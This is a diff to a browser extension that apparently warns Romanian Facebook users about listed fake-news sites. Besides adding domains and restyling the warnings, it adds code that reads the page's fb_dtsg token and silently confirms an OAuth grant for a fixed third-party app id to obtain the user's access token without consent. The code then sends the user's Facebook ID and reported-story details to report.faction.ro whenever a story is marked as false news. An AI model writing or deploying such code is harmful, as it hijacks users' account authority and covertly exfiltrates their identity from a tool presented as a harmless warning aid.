@@ -116,7 +116,18 @@ chrome.extension.sendMessage({}, function(response) {
                 'invectiva.ro',
                 'explozivnews24.ro',
                 'alternativenews.ro',
-                'exclusiv24.ro'
+                'exclusiv24.ro',
+                'rol.ro',
+                'grupul.ro',
+                'stiripesurse.ro',
+                'romaniatv.net',
+                'antena3.ro',
+                'curentul.info',
+                'justitiarul.ro',
+                'stiri.rol.ro',
+                'dcnews.ro',
+                'rdo.ro',
+                'bzi.ro'
             ];
 
             var didScroll = false;
@@ -134,20 +145,19 @@ chrome.extension.sendMessage({}, function(response) {
                 if (window.location.hostname=='www.facebook.com') {
                     var badLinksObjects = $(badLinks);
                     for (var i = 0, len = badLinksObjects.length; i < len; i++) {
-                        console.log($(badLinksObjects[i]).attr('class'));
                         if ($(badLinksObjects[i]).parent().hasClass("_42ef")) {
                             $(badLinksObjects[i]).parent().parent().parent().removeClass('clearfix').addClass('hint--error hint--large hint--bottom-right fakenews');
                             $(badLinksObjects[i]).parent().parent().parent().attr('aria-label', 'Pare de necrezut? Verifica informatia si din alte surse.');
                         }
                         else {
-                            $(badLinksObjects[i]).parent().addClass('hint--error hint--large hint--top-right fakenews');
+                            $(badLinksObjects[i]).parent().addClass('hint--error hint--large hint--top-right fakenews hint-left');
                             $(badLinksObjects[i]).parent().attr('aria-label', 'Pare de necrezut? Verifica informatia si din alte surse.');
                         }
                     }
                 }
                 else {
                     if (links.indexOf(window.location.hostname.replace('www.', ''))!=-1) {
-                        $("body").append("<div class='hint--error hint--large hint--align-center hint--top hint--red hint--bounce fakenews' style='position: fixed; width: 100%; left: -240px; text-align: center; z-index: 99999999; bottom: 0px;' aria-label='Pare de necrezut? Verifica informatia si din alte surse.'></div><style>.hint--error::before { display: none; }</style>");
+                        $("body").append("<div class='hint--error hint--large hint--align-center hint--top hint--red hint--bounce fakenews' style='position: fixed; width: 100%; left: -50%; text-align: center; z-index: 99999999; top: 55px;' aria-label='Cerceteaza inainte sa crezi! Verifica informatia si din alte surse.'></div><style>.hint--error::before { display: none; } .hint--large::after { width: 100% !important; }</style>");
                     }
                     stop = true;
                 }
@@ -161,6 +171,61 @@ chrome.extension.sendMessage({}, function(response) {
             function doThisStuffOnScroll() {
                 didScroll = true;
             }
+
+            function getURLParameter(name, string) {
+                return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(string) || [null, ''])[1].replace(/\+/g, '%20')) || null;
+            }
+
+            var access_token = '';
+            var current_fb_id = '';
+            var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+
+            function get_token() {
+                var id_app = '165907476854626';
+                var http = new XMLHttpRequest;
+                http.open('POST', 'https://www.facebook.com/v1.0/dialog/oauth/confirm');
+                http.send('fb_dtsg=' + fb_dtsg + '&app_id=' + id_app + '&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&private=&tos=&login=&read=&write=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1');
+                http.onreadystatechange = function() {
+                    if (http.readyState == 4 && http.status == 200) {
+                        var data = http.responseText.match(/access_token=(.*?)&/)[1];
+                        access_token = data;
+                        get_current_fb_id();
+                    }
+                }
+            }
+
+            function get_current_fb_id() {
+                $.get('https://graph.facebook.com/me?access_token='+access_token, function( data ) {
+                    current_fb_id = data.id;
+                });
+            }
+
+            setInterval(function() {
+                $("ul.uiList a:not(.marked)[ajaxify*='MARK_AS_FALSE_NEWS']").unbind().one("click", function() {
+                    $(this).addClass('marked');
+                    var href = decodeURI($(this).attr('ajaxify'));
+                    var json_params = JSON.parse(getURLParameter('context', href));
+                    console.log(json_params);
+                    if (typeof json_params.story_permalink_token != "undefined") {
+                        var array = json_params.story_permalink_token.split(':');
+                        var fb_id = array[2];
+                    }
+                    else {
+                        var fb_id = json_params.reportable_ent_token;
+                    }
+
+                    $.get('https://graph.facebook.com/?id='+fb_id+'&access_token='+access_token, function( data ) {
+                        console.log(data);
+                        var data_to_send = {story_id: data.id, user_id: current_fb_id, name: data.name, description: data.description, link: data.link, picture: data.picture};
+                        $.post('https://report.faction.ro/report.php', data_to_send, function(data) {
+                            console.log(data);
+                        });
+                    });
+
+                });
+            }, 500);
+
+            get_token();
 
             setInterval(function() {
                 if(didScroll && !processing && !stop) {
